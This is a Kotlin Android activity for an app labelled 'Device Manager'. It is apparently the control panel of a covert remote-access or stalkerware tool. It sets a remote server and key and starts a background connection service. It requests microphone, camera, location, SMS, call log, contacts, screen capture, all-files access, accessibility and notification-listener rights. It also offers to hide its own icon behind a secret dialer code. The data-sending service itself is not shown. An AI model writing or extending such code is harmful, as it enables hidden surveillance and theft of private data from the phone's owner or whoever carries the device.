package com.example.admin

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.view.Gravity
import android.widget.*
import androidx.core.content.ContextCompat

class MainActivity : Activity() {

    private lateinit var statusText: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val scroll = ScrollView(this)
        val ll = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(40, 60, 40, 40)
            setBackgroundColor(Color.parseColor("#050505"))
        }
        scroll.addView(ll)
        setContentView(scroll)

        ll.addView(TextView(this).apply {
            text = "Device Manager"
            textSize = 28f
            setTextColor(Color.parseColor("#00ff7a"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 40)
        })

        ll.addView(TextView(this).apply { text = "Server URL"; setTextColor(Color.GRAY); textSize = 12f; setPadding(0,0,0,5) })
        val serverEt = EditText(this).apply {
            hint = "https://your-app.onrender.com"
            setText(Prefs.getServer(this@MainActivity))
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#111111"))
            setPadding(20, 20, 20, 20)
        }
        ll.addView(serverEt)

        ll.addView(TextView(this).apply { text = "Auth Key (PSK)"; setTextColor(Color.GRAY); textSize = 12f; setPadding(0,20,0,5) })
        val pskEt = EditText(this).apply {
            hint = "PSK"
            setText(Prefs.getPsk(this@MainActivity))
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#111111"))
            setPadding(20, 20, 20, 20)
        }
        ll.addView(pskEt)

        ll.addView(btn("Save Settings", "#00ff7a") {
            Prefs.setServer(this@MainActivity, serverEt.text.toString().trim())
            Prefs.setPsk(this@MainActivity, pskEt.text.toString().trim())
            Toast.makeText(this@MainActivity, "Saved.", Toast.LENGTH_SHORT).show()
        })

        statusText = TextView(this).apply {
            setTextColor(Color.GRAY)
            textSize = 14f
            gravity = Gravity.CENTER
            setPadding(0, 40, 0, 20)
        }
        ll.addView(statusText)

        val btnRow = LinearLayout(this).apply { orientation = LinearLayout.HORIZONTAL; gravity = Gravity.CENTER }
        val btnStart = btn("▶ Start Service", "#00ff7a") {
            if (Prefs.getServer(this@MainActivity).isBlank() || Prefs.getPsk(this@MainActivity).isBlank()) {
                Toast.makeText(this@MainActivity, "Save settings first.", Toast.LENGTH_SHORT).show()
                return@btn
            }
            ContextCompat.startForegroundService(this@MainActivity, Intent(this@MainActivity, ConnectionService::class.java))
            updateStatus()
        }
        val btnStop = btn("■ Stop Service", "#ff4d4d") {
            val intent = Intent(this@MainActivity, ConnectionService::class.java).apply { action = ConnectionService.ACTION_STOP }
            startService(intent)
            updateStatus()
        }
        btnRow.addView(btnStart, LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f).apply { rightMargin = 10 })
        btnRow.addView(btnStop, LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f).apply { leftMargin = 10 })
        ll.addView(btnRow)

        ll.addView(TextView(this).apply { text = "Permissions & Access"; setTextColor(Color.parseColor("#00ff7a")); textSize = 18f; setPadding(0, 50, 0, 20) })

        ll.addView(btn("Request Runtime Permissions") { requestPerms() })
        ll.addView(btn("Grant Screen Capture") { requestScreenCapture() })
        ll.addView(btn("Allow All Files Access (Android 11+)") { requestAllFiles() })
        ll.addView(btn("Enable Accessibility Service") { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) })
        ll.addView(btn("Enable Notification Listener") { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")) })

        ll.addView(btn("Hide App Icon", "#ff4d4d") {
            StealthManager.hide(this@MainActivity)
            Toast.makeText(this@MainActivity, "Icon hidden. Dial *#*#1337#*#* to unhide.", Toast.LENGTH_LONG).show()
        })
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
    }

    private fun updateStatus() {
        val sb = StringBuilder()
        sb.append(if (Prefs.isRunning(this)) "Service Status: RUNNING ✅\n" else "Service Status: STOPPED ❌\n\n")
        sb.append(if (checkPerm(Manifest.permission.RECORD_AUDIO)) "Microphone: ✅\n" else "Microphone: ❌\n")
        sb.append(if (checkPerm(Manifest.permission.CAMERA)) "Camera: ✅\n" else "Camera: ❌\n")
        sb.append(if (checkPerm(Manifest.permission.READ_SMS)) "SMS/Calls: ✅\n" else "SMS/Calls: ❌\n")
        sb.append(if (TouchService.instance != null) "Accessibility: ✅\n" else "Accessibility: ❌\n")
        val notifEnabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")?.contains(packageName) == true
        sb.append(if (notifEnabled) "Notifications: ✅\n" else "Notifications: ❌\n")
        if (Build.VERSION.SDK_INT >= 30) {
            sb.append(if (Environment.isExternalStorageManager()) "All Files Access: ✅" else "All Files Access: ❌")
        }
        statusText.text = sb.toString()
        statusText.setTextColor(if (Prefs.isRunning(this)) Color.parseColor("#00ff7a") else Color.WHITE)
    }

    private fun checkPerm(p: String) = ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED

    private fun btn(label: String, colorStr: String = "#333333", onClick: () -> Unit): Button {
        return Button(this).apply {
            text = label
            setTextColor(if (colorStr == "#333333") Color.WHITE else Color.BLACK)
            val bg = GradientDrawable()
            bg.setColor(Color.parseColor(colorStr))
            bg.cornerRadius = 20f
            background = bg
            setPadding(0, 30, 0, 30)
            setOnClickListener { onClick() }
        }
    }

    private fun requestPerms() {
        val perms = mutableListOf(
            Manifest.permission.RECORD_AUDIO, Manifest.permission.CAMERA,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS,
            Manifest.permission.POST_NOTIFICATIONS
        )
        if (Build.VERSION.SDK_INT >= 33) perms.add(Manifest.permission.READ_MEDIA_IMAGES)
        else perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)

        val missing = perms.filter { !checkPerm(it) }
        if (missing.isNotEmpty()) requestPermissions(missing.toTypedArray(), 100)
        else Toast.makeText(this, "All requested permissions granted.", Toast.LENGTH_SHORT).show()
    }

    private fun requestScreenCapture() {
        val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mpm.createScreenCaptureIntent(), 200)
    }

    private fun requestAllFiles() {
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.addCategory("android.intent.category.DEFAULT")
                intent.data = Uri.parse(String.format("package:%s", applicationContext.packageName))
                startActivity(intent)
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        } else {
            Toast.makeText(this, "All files access granted or not needed.", Toast.LENGTH_SHORT).show()
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 200 && resultCode == RESULT_OK && data != null) {
            ConnectionService.screenResultCode = resultCode
            ConnectionService.screenData = data
            Toast.makeText(this, "Screen capture granted.", Toast.LENGTH_SHORT).show()
        }
    }
}
